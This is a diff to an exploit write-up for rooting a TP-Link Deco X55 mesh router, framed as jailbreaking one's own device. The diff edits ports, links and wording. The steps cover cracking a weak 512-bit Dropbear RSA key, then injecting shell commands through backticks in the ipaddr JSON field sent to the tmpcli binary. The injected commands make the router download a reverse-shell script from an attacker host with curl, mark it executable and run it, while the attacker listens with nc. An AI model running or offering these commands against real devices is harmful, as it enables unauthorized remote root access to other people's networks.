@@ -8,7 +8,7 @@ However, vulnerable versions of such Dropbear SSH connections use 512-bit RSA ke
 
 ## Attack Step 1: Fetch the public key from the gateway and crack to learn the private key
 
-To jailbreak your own Deco X55, you first use `fetch_dropbear_pub.py`: (`pip install paramiko` is needed)
+To jailbreak your own Deco X55, you first use [fetch_dropbear_pub.py](./fetch_dropbear_pub.py): (`pip install paramiko` is needed)
 
 ![](./fetch_512_rsa_pub.png)
 
@@ -66,11 +66,13 @@ Download my reverse shell [here](./luashell_tplink.sh), and you might want to ch
 
 ## Attack Step 6: Prepare the environment to execute the tmpcli binary on the attacker's machine
 
-The attacker must use a aarch64 machine to launch this attack. 
+The attacker must use an aarch64 machine to launch this attack. 
 
 Download this vulnerable firmware [here](https://static.tp-link.com/upload/firmware/2023/202303/20230331/Deco_X55_V1.0_1.2.2_Build_230301.zip). 
 
-Unpack this firmware (temporarily left as an exercise). Change your directory to the file system root, and use the export command. After that, try running the `/usr/bin/tmpcli` command.   
+Sorry, clicking the link does not work. Please input the firmware address manually in a fresh browser tab to download it. 
+
+Unpack this firmware (temporarily left as an exercise). Change your directory to the file system root, and use the export command. After that, try running the `/usr/bin/tmpcli` binary.   
 
 `export LD_LIBRARY_PATH=$PWD/usr/lib:$PWD/lib`
 
@@ -81,7 +83,7 @@ Unpack this firmware (temporarily left as an exercise). Change your directory to
 Execute the command: 
 
 ```
-echo '{"params":{"ipaddr":"192.168.71.250`curl -o /tmp/luashell.sh http://192.168.68.51:4443/luashell_tplink.sh`", "port":"6489"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
+echo '{"params":{"ipaddr":"192.168.71.250`curl -o /tmp/luashell.sh http://192.168.68.51:4443/luashell_tplink.sh`", "port":"6666"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
 ```
 
 This command tells the gateway to download the `luashell_tplink.sh` from the attacker's server (http://192.168.68.51:4443), and writes this script to `/tmp/luashell.sh`. 
@@ -89,14 +91,14 @@ This command tells the gateway to download the `luashell_tplink.sh` from the att
 Use this command to chmod the script:
 
 ```
-echo '{"params":{"ipaddr":"192.168.71.250`chmod u+x /tmp/luashell.sh`", "port":"6489"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
+echo '{"params":{"ipaddr":"192.168.71.250`chmod u+x /tmp/luashell.sh`", "port":"6666"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
 ```
 
-On the attacker's machine, run something like `nc -l 9001`.
+On the attacker's machine, run something like `nc -l 9002`.
 
 Finally, execute the script on the mesh gateway:
 ```
-echo '{"params":{"ipaddr":"192.168.71.250`/tmp/luashell.sh`", "port":"6489"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
+echo '{"params":{"ipaddr":"192.168.71.250`/tmp/luashell.sh`", "port":"6666"}}' | ./tmpcli -o 0xc505 -u 127.0.0.1 -p 20002
 ```
 
 Hit `uname -a` and `id` in the attacker's terminal. You will see something like:
